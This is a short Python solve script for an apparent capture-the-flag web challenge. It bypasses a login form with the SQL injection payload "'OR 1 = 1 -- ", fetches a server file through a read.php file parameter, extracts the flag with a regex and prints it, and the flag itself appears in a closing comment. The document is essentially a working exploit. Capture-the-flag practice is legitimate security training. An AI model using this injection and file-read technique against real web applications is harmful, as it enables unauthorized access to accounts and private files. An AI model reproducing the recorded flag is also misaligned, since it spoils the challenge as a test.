import requests
import re

s = requests.session()
site = "http://trova-le-soluzioni-3.challs.olicyber.it/"

r = s.post(site, data = {"username" : "'OR 1 = 1 -- ", "password" : "graziexsqlinjection :3"})
r2 = s.get(f"{site}/read.php?file=/soluzioni/20240509.txt").text
match = re.search(r'flag\{[^\}]+\}', r2)
flag = match.group(0)
print(flag)

#flag{SQL_inj3ction_se3ms_4m4z1ng}